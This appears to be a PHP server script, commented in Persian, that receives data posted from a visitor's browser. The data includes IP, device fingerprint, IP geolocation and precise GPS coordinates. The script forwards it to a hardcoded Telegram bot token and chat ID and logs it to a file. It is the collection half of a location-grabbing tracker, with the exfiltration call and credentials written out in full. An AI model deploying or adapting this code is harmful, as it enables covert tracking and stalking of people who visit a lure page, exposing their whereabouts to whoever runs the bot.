<?php
// دریافت داده‌ها
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data) {
    $message = "📊 اطلاعات جدید:\n";
    $message .= "🕒 زمان: " . date('Y-m-d H:i:s') . "\n";
    $message .= "🌐 آی‌پی: " . ($data['ip'] ?? 'N/A') . "\n";
    $message .= "🔍 مرورگر: " . ($data['userAgent'] ?? 'N/A') . "\n";
    $message .= "📱 نمایشگر: " . ($data['screen'] ?? 'N/A') . "\n";
    $message .= "🗣️ زبان: " . ($data['language'] ?? 'N/A') . "\n";
    $message .= "⏰ تایم‌زون: " . ($data['timezone'] ?? 'N/A') . "\n";
    $message .= "🍪 کوکی: " . (($data['cookies']) ? 'بله' : 'خیر') . "\n";
    $message .= "💻 پلتفرم: " . ($data['platform'] ?? 'N/A') . "\n\n";

    // لوکیشن GPS دقیق
    if (isset($data['gpsLocation']['googleMaps'])) {
        $message .= "📍 GPS دقیق: " . $data['gpsLocation']['googleMaps'] . "\n";
        $message .= "🎯 دقت: " . ($data['gpsLocation']['accuracy'] ?? 'N/A') . "\n\n";
    }

    // لوکیشن آی‌پی
    if (isset($data['ipLocation']['googleMaps'])) {
        $message .= "🌍 کشور: " . ($data['ipLocation']['country'] ?? 'N/A') . "\n";
        $message .= "📍 منطقه: " . ($data['ipLocation']['region'] ?? 'N/A') . "\n";
        $message .= "🏙️ شهر: " . ($data['ipLocation']['city'] ?? 'N/A') . "\n";
        $message .= "📡 ISP: " . ($data['ipLocation']['isp'] ?? 'N/A') . "\n";
        $message .= "🗺️ لینک IP Map: " . $data['ipLocation']['googleMaps'] . "\n";
    }

    // ارسال به تلگرام (اختیاری)
    $telegramToken = '7741313356:AAG7m5Xgu5dvt5ktR2znu-y_NSkN893UBrE';
    $chatID = '5435474042';
    
    if ($telegramToken !== 'YOUR_BOT_TOKEN' && $chatID !== 'YOUR_CHAT_ID') {
        $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
        $postData = [
            'chat_id' => $chatID,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }

    // ذخیره در فایل
    file_put_contents('log.txt', print_r($data, true) . "\n\n", FILE_APPEND);
}

header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
?>
